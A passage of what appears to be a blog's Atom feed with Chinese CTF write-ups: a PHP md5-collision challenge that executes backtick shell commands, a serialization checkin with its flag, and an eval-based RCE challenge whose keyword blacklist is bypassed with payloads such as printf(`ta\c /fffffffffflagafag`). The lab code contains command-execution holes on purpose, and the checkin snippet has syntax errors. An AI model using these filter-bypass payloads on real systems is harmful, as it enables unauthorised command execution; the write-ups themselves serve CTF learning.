&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里有正则过滤，并且需要强碰撞</p><p>直接burp:</p><p><img src="/../images/image-20231219203949964.png" alt="image-20231219203949964"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NISACTF-2022-popchains&quot;&gt;&lt;a href=&quot;#NISACTF-2022-popchains&quot; class=&quot;headerlink&quot; title=&quot;[NISACTF 2022]popchains&quot;&gt;&lt;/a&gt;[NISACTF 2022]popch</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF刷题</title>
    <link href="http://example.com/2023/11/06/NSSCTF%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/11/06/NSSCTF%E5%88%B7%E9%A2%98/</id>
    <published>2023-11-06T14:11:38.000Z</published>
    <updated>2023-12-11T00:54:05.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h1><p><img src="/../images/image-20231104185237617.png" alt="avatar"></p><p>构造一个数组使username指向true，password指向true</p><p>序列化输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt;<span class="hljs-literal">true</span>;<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt;<span class="hljs-literal">true</span>;<br><br>)<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>);<br></code></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>&#123;<span class="hljs-number">5</span>d142734-b351-<span class="hljs-number">4369</span>-<span class="hljs-number">831</span>f-<span class="hljs-number">1</span>ad48e317ce6&#125;<br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你想干什么？？？？？？？？？&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>printf输出格式化字符串</p><p>&#96;&#96;反引号内容被当作命令执行</p><p>\反斜杠分割</p><p>payload:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?code=printf(`l\s /`)<span class="hljs-comment">;</span><br>?code=printf(`ta\c /fffffffffflagafag`)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HUBUCTF-2022-新生赛-checkin&quot;&gt;&lt;a href=&quot;#HUBUCTF-2022-新生赛-checkin&quot; class=&quot;headerlink&quot; title=&quot;[HUBUCTF 2022 新生赛]checkin&quot;&gt;&lt;/a&gt;[HUBUCTF 2022</summary>
      
    
    
    
    
  </entry>
  
</feed>
